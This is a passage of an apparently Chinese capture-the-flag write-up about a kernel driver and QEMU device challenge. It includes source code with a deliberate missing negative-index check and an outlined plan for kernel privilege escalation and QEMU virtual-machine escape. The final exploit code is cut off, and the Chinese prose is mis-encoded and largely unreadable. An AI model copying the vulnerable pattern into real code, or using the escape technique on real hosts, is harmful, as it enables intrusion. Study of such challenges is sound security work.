full,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>            ret = wlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Fill the unused part of last buffer.</span><br><span class="hljs-comment">         * We mainly fill the data that is less than BYTEDEV_BUF_SIZE there.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_last_empty(dev)) &#123;<br>            <span class="hljs-type">int</span> d_idx = <br>                    (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span> =</span> dev-&gt;data_queue[d_idx];<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left = BYTEDEV_BUF_SIZE - d-&gt;len;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clen = left &gt; size ? size : left;<br><br>            ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>            <span class="hljs-keyword">if</span> (ret) &#123;<br>                printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br><br>            size -= clen;<br>            d-&gt;len += clen;<br>            wlen += clen;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * When we arrive at there, it means that there&#x27;s no space left</span><br><span class="hljs-comment">         * on the tail buffer, so we alloc a new buffer there.</span><br><span class="hljs-comment">         */</span><br>        d_idx = dev-&gt;tail_idx;<br>        dev-&gt;data_queue[d_idx] = <br>                    kmalloc(BYTEDEV_BUF_SIZE + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data), <br>                            GFP_KERNEL_ACCOUNT);<br>        dev-&gt;tail_idx++;<br>        dev-&gt;tail_idx %= BYTEDEV_MAX_BUFS;<br><br>        d = dev-&gt;data_queue[d_idx];<br>        d-&gt;len = <span class="hljs-number">0</span>;<br>        d-&gt;offset = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Copy the data there */</span><br>        left = BYTEDEV_BUF_SIZE;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;len += clen;<br>        wlen += clen;<br>    &#125;<br><br>    ret = wlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="äºŒã€QEMU-è®¾å¤‡éƒ¨åˆ†"><a href="#äºŒã€QEMU-è®¾å¤‡éƒ¨åˆ†" class="headerlink" title="äºŒã€QEMU è®¾å¤‡éƒ¨åˆ†"></a>äºŒã€QEMU è®¾å¤‡éƒ¨åˆ†</h2><p>ç¬¬äºŒé˜¶æ®µåˆ™æ˜¯å¯¹è®¾å¤‡ block æ¨¡å¼ä¸‹çš„åº”ç”¨ï¼Œè¿™é‡Œ QEMU æ¨¡æ‹Ÿäº†ä¸€ä¸ªç±»ä¼¼äºç¡¬ç›˜çš„è®¾å¤‡ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å†™æŒ‡å®šçš„æ‰‡åŒºï¼ˆå¤§å°ä¸º 512 å­—èŠ‚ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevRegs</span> &#123;</span><br>    <span class="hljs-type">int</span> mode;<br>    <span class="hljs-type">int</span> blk_idx;<br>    <span class="hljs-type">int</span> blk_status;<br>&#125; BYTEPCIDevRegs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    BYTEPCIDevRegs regs;<br><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br><br>    <span class="hljs-type">char</span> *blk_mem[BYTEDEV_SECTOR_NUM];<br>&#125; BYTEPCIDevState;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨ PMIO æ¥å®ç°è®¾å¤‡æ¨¡å¼çš„è·å–ä¸åˆ‡æ¢ã€æ‰‡åŒºçš„åˆ‡æ¢ï¼Œä½¿ç”¨ MMIO æ¥å®ç°å¯¹ç‰¹å®šæ‰‡åŒºçš„è¯»å†™ï¼Œè€Œæ¼æ´ä¾¿å‡ºåœ¨æ‰‡åŒºçš„åˆ‡æ¢ä¸Šï¼Œè™½ç„¶è®¾å¤‡é‡Œæœ‰ä¸€ä¸ªåå‘çš„æ‰‡åŒºç´¢å¼•è¶Šç•Œæ£€æŸ¥ï¼Œä½†æ˜¯å­˜å‚¨å½“å‰æ‰‡åŒºç´¢å¼•æ‰€ä½¿ç”¨çš„ä¸º int ç±»å‹çš„å˜é‡ï¼Œ<strong>è€Œè®¾å¤‡ä»£ç ä¸­å¹¶æ²¡æœ‰å¯¹ç´¢å¼•ä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œæ£€æŸ¥</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œå‰å‘çš„è¶Šç•Œæ“ä½œï¼Œè‹¥æ˜¯åœ¨ä½åœ°å€å¤„å­˜åœ¨å¯åˆ©ç”¨çš„æŒ‡é’ˆåˆ™å¯ä»¥ç›´æ¥å®Œæˆè¶Šç•Œçš„è¯»å†™æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">byte_dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    BYTEPCIDevState *ds = BYTEDEV_PCI(opaque);<br>    <span class="hljs-type">int</span> op_idx = val;<br><br>    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    smp_mb();<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_MODE:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_BLK:<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_STREAM:<br>                    ds-&gt;regs.mode = val;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_BLK_IDX:<br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.blk_status == BYTEDEV_BLK_STATUS_BUSY) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.mode != BYTEDEV_MODE_BLK) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-comment">/** </span><br><span class="hljs-comment">             * There&#x27;s where we made our basic bug: OOB rw forward </span><br><span class="hljs-comment">             * Because there&#x27;s no check for minus idx there.</span><br><span class="hljs-comment">             * */</span><br>            <span class="hljs-keyword">if</span> (op_idx &gt;= BYTEDEV_SECTOR_NUM) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            ds-&gt;regs.blk_idx = op_idx;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_BUSY;<br>            <span class="hljs-keyword">if</span> (!ds-&gt;blk_mem[ds-&gt;regs.blk_idx]) &#123;<br>                ds-&gt;blk_mem[ds-&gt;regs.blk_idx] = g_malloc(BYTEDEV_SECTOR_SIZE);<br>            &#125;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_READY;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´çš„åˆ©ç”¨å­˜åœ¨ä¸¤ä¸ªé˜¶æ®µï¼šç¬¬ä¸€é˜¶æ®µæ˜¯åˆ©ç”¨å†…æ ¸æ¨¡å—ä¸­æµæ¨¡å¼å­˜åœ¨çš„æ¼æ´å®Œæˆææƒï¼Œç¬¬äºŒé˜¶æ®µåˆ™æ˜¯åˆ©ç”¨æ¨¡æ‹Ÿè®¾å¤‡ä¸­å­˜åœ¨çš„æ¼æ´å®Œæˆè™šæ‹ŸåŒ–é€ƒé€¸</p><h2 id="Stage-I-kernel-primitive"><a href="#Stage-I-kernel-primitive" class="headerlink" title="Stage.I - kernel primitive"></a>Stage.I - kernel primitive</h2><p>ç”±äºæˆ‘ä»¬ç›´æ¥æœ‰ UAF å’Œè¶Šç•Œè¯»å†™ï¼Œé‚£ä¹ˆç¬¬ä¸€é˜¶æ®µçš„è§£é¢˜æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥ä¸€ä¸ª buffer åè¯»å–å‡ºè¯¥ buffer åˆ¶é€ å‡º UAFï¼Œä¹‹ååˆ©ç”¨å…¶ä»–ç»“æ„ä½“æ”¹å†™å…¶æ•°æ®ç»Ÿè®¡å­—æ®µï¼Œä¹‹åå†é€šè¿‡è¶Šç•Œå†™è¿›è¡Œææƒï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºå¼€å¯äº† hardened usercopy æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥åœ¨ä¸‹ä¸€ä¸ª object ä¸­è¿›è¡Œæ•°æ®å†™å…¥ï¼Œè€Œä¸èƒ½è¿›è¡Œè·¨ object çš„æ•°æ®æ‹·è´</p><p>ç”±äºåˆ†é… buffer æ‰€ç”¨çš„ flag ä¸º GFP_KERNEL_ACCOUNTï¼Œå› æ­¤æœ€åçš„ææƒè§£æ³•ç›´æ¥å¥—ç”¨ CVE-2021-22555 çš„å †å–· msg_msg + sk_buff çš„æ¨¡æ¿å³å¯</p><h2 id="Stage-II-QEMU-escape"><a href="#Stage-II-QEMU-escape" class="headerlink" title="Stage.II - QEMU escape"></a>Stage.II - QEMU escape</h2><p>ç”±äºè¯»å†™è¿‡ç¨‹ä¸ºé€šè¿‡å¯¹åº”ç´¢å¼•çš„æŒ‡é’ˆå®Œæˆè¯»å†™ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å‘å‰å¯»æ‰¾æŒ‡å‘åˆé€‚åŒºåŸŸçš„æŒ‡é’ˆæ¥å®ç°åˆ©ç”¨ï¼Œä¸‡å¹¸çš„æ˜¯æˆ‘ä»¬å‰å‘å¯è¯»çš„åŒºåŸŸä¸­æœ‰ MemoryRegionï¼Œè¿˜æœ‰è®¾å¤‡ç»“æ„ä½“çš„çˆ¶ç±» PCIDevice ï¼š</p><p>åˆ©ç”¨ MemoryRegion æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºè®¾å¤‡è‡ªèº«ç»“æ„ä½“çš„åœ°å€å¹¶è¯»å†™å¼€å¤´çš„ 512 å­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ io_regions ä¸­çš„ç©ºé—²å­—æ®µæ„é€  ROP æˆ–æ˜¯ä¸€äº›å…¶ä»–ä¸œè¥¿</p><p>å¯¹äº PCIDevice æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€ä¸Šå±‚çš„çˆ¶ç±» Object çš„ properties æˆå‘˜æ³„éœ²å‡º glib çš„åŸºåœ°å€ï¼Œä»è€Œæ³„éœ²å‡º glibc çš„åŸºåœ°å€ï¼ˆå…¶åŠ è½½åœ°å€é—´åç§»å›ºå®šï¼‰ï¼›åŒæ—¶æˆ‘ä»¬è¿˜èƒ½é€šè¿‡å…¶ io_regions å­—æ®µå®Œæˆå¯¹ MemoryRegion çš„è¯»å†™</p><p>é‚£ä¹ˆæ•´ä¸ªåˆ©ç”¨æ€è·¯å°±éå¸¸æ¸…æ™°äº†ï¼šæˆ‘ä»¬å…ˆå‰å‘è¯»å– properties æ³„éœ²å‡º libcï¼Œä¹‹åè¯»å– MemoryRegion æ³„éœ²å‡ºè®¾å¤‡ç»“æ„ä½“åœ°å€ï¼Œåœ¨ PCIDevice.io_regions ä¸Šæ„é€  fake MemoryRegionOps ååŠ«æŒ PMIO çš„ MemoryRegion çš„ ops ä»è€Œå®Œæˆè™šæ‹Ÿæœºé€ƒé€¸</p><h2 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h2><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span 